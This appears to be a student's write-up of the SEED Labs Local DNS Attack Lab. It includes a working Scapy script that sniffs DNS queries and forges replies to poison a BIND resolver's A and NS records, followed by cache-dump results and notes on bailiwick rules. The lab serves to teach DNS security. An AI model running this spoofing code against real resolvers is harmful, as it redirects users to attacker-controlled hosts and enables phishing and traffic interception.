# DNS Cache Poisoning

This module demonstrates DNS cache poisoning techniques using Scapy inside a Dockerized lab environment. Attacks are performed against a local BIND resolver to show how crafted DNS responses can corrupt a resolver's cache.

## Environment

The lab runs on the Docker network from `dns_lab/` (see that directory for setup). Key hosts:

| Host | Role | IP |
|---|---|---|
| Attacker | Runs sniff-and-spoof scripts | (your container) |
| Local DNS | BIND resolver | `172.30.0.2` |
| User | Sends DNS queries | `172.30.0.3` |

The attacker's script sniffs DNS queries on the Docker bridge interface and races a forged reply back to the resolver before the legitimate upstream answer arrives.

## Environment Setup

BIND must be configured to forward queries upstream so it can resolve external names. Add the following block to `/etc/bind/named.conf.options` inside the DNS server container:

```text
options {
    forwarders {
        8.8.8.8;
        1.1.1.1;
    };
    forward only;
};
```

## Core Spoofing Script

All tasks use a shared `dns_sniff_spoof.py` script. The script:

1. Sniffs UDP packets destined for port 53.
2. When a query for `www.example.com` is detected, builds a crafted DNS response with controlled Answer, Authority, and Additional sections.
3. Sends the forged reply back to the source.

```python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer: redirect www.example.com to attacker IP
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5')

        # Authority: point example.com NS to attacker nameserver
        NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')

        # Additional: glue record for the fake NS
        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=1, arcount=1,
                     an=Anssec, ns=NSsec1, ar=Addsec1)

        send(IPpkt / UDPpkt / DNSpkt)

sniff(iface='br-423615029db2', filter='udp and dst port 53', prn=spoof_dns)
```

## Useful Commands

```bash
# On the DNS server container — clear the resolver cache before each task
rndc flush

# On the user container — trigger a DNS query
dig www.example.com

# On the DNS server container — inspect cached records after the attack
rndc dumpdb -cache
cat /var/cache/bind/dump.db
```

---

## Lab Tasks

### Task 1 — Direct Spoofing to User

The script races a forged answer directly to the **user** machine before the real reply arrives. Because the upstream response is typically faster, the attack slows down or suppresses the real answer by adding network delay. The user sees the attacker-controlled IP in the Answer section.

**Takeaway:** Direct spoofing only corrupts a single lookup and requires winning the race on every query.

---

### Task 2 — DNS Cache Poisoning (A Record)

The target shifts to the **local DNS server**. A forged response causes the resolver to cache `www.example.com → 10.0.2.5`. All future queries are answered from the poisoned cache until the TTL expires.

Cache dump confirms:
```
www.example.com.   863989   IN A   10.0.2.5
```

**Takeaway:** Poisoning the cache has a persistent effect — all users of the resolver are affected until the record expires.

---

### Task 3 — Spoofing NS Records (Same Zone)

The Authority section is poisoned to install a fake NS record: `example.com NS ns.attacker32.com`. The Additional section provides a glue A record pointing `ns.attacker32.com → 10.9.0.153`.

Cache dump shows:
```
example.com.   NS   ns.attacker32.com.
ns.attacker32.com.   IN A   10.9.0.153
```

**Takeaway:** Poisoning an NS record gives the attacker control over an entire zone, not just a single hostname.

---

### Task 4 — Spoofing NS Records for Another Domain

An extra NS record for `google.com` is injected in the same Authority section alongside the `example.com` record. The resolver caches the `example.com` NS entry but **ignores** the unrelated `google.com` NS record.

**Takeaway:** Modern resolvers validate authority data and refuse to cache NS records for out-of-bailiwick domains, limiting the blast radius of this style of attack.

---

### Task 5 — Spoofing Additional Section Records

The Additional section includes glue A records for both `ns.attacker32.com` and `ns.example.com` (both listed in Authority), plus an unrelated A record for `www.facebook.com`.

Cache dump shows:
```
ns.attacker32.com.   IN A   1.2.3.4
ns.example.com.      IN A   5.6.7.8
example.com.         NS     ns.example.com.
                     NS     ns.attacker32.com.
www.example.com.     IN A   10.0.2.5
```

The `www.facebook.com` record is **not** cached.

**Takeaway:** Resolvers cache glue records only when the corresponding NS is in the Authority section of the same response. Unrelated additional records are silently discarded.

---

## Conclusion

Direct spoofing affects a single query; cache poisoning has lasting impact because the forged records persist until TTL expiry. However, resolvers enforce bailiwick rules — they cache authority and glue records only for zones directly related to the queried name, which limits cross-domain poisoning attempts.

---

## Original Assignment

> Source: *SEED Labs — Local DNS Attack Lab* (Wenliang Du)

### Lab Environment

Four containers on `10.9.0.0/24`:

| Host | IP | Role |
|---|---|---|
| Attacker | `10.9.0.1` | Runs sniff-and-spoof scripts |
| User | `10.9.0.5` | Sends DNS queries |
| Local DNS Server | `10.9.0.53` | BIND9 resolver |
| Attacker's Nameserver | `10.9.0.153` | Hosts `attacker32.com` and fake `example.com` |

The local DNS server fixes its source port to `33333` and has DNSSEC disabled for this lab. Cache commands:

```bash
rndc flush           # clear the resolver cache
rndc dumpdb -cache   # dump cache to /var/cache/bind/dump.db
cat /var/cache/bind/dump.db
```

### Setup Verification

From the User container, verify the lab is configured correctly:

```bash
# Should return the IP from attacker32.com.zone
dig ns.attacker32.com

# Should return the official IP for www.example.com
dig www.example.com

# Should return the attacker's fake IP
dig @ns.attacker32.com www.example.com
```

---

### Task 1 — Directly Spoofing Response to User

Write a program that sniffs DNS queries for `www.example.com` and immediately sends a forged DNS reply to the **user machine** before the legitimate reply arrives.

- Run the program while issuing `dig www.example.com` from the user container.
- Compare results before and after the attack.
- Clear the local DNS cache before each test.

> If the spoofed packet consistently arrives after the real reply, add network delay on the router:
> ```bash
> tc qdisc add dev eth0 root netem delay 100ms
> ```

---

### Task 2 — DNS Cache Poisoning — Spoofing Answers

Shift the target from the user to the **local DNS server**. Modify the attack program to poison the resolver's A record cache for `www.example.com`.

- Flush the cache before the attack: `rndc flush`
- After the attack, verify the cache contains the attacker's IP: `rndc dumpdb -cache && cat /var/cache/bind/dump.db`

---

### Task 3 — Spoofing NS Records

Extend the attack to inject a forged NS record in the Authority section so that `ns.attacker32.com` becomes the cached nameserver for the entire `example.com` zone:

```
;; AUTHORITY SECTION:
example.com.  259200  IN  NS  ns.attacker32.com.
```

- Verify the NS record appears in the DNS cache.
- Confirm that future queries for any hostname under `example.com` resolve through the attacker's nameserver.

---

### Task 4 — Spoofing NS Records for Another Domain

Add a second NS record to the Authority section attempting to also delegate `google.com` to the attacker's nameserver:

```
;; AUTHORITY SECTION:
example.com.  259200  IN  NS  ns.attacker32.com.
google.com.   259200  IN  NS  ns.attacker32.com.
```

- Check the DNS cache after the attack.
- Describe and explain which records were cached and which were not.

---

### Task 5 — Spoofing Records in the Additional Section

Include the following entries in the Additional section when responding to a `www.example.com` query:

```
;; AUTHORITY SECTION:
example.com.  259200  IN  NS  ns.attacker32.com.
example.com.  259200  IN  NS  ns.example.com.

;; ADDITIONAL SECTION:
ns.attacker32.com.  259200  IN  A  1.2.3.4
ns.example.com.     259200  IN  A  5.6.7.8
www.facebook.com.   259200  IN  A  3.4.5.6
```

- Report which entries are cached and which are not.
- Explain why unrelated additional records (e.g., `www.facebook.com`) are or are not accepted.
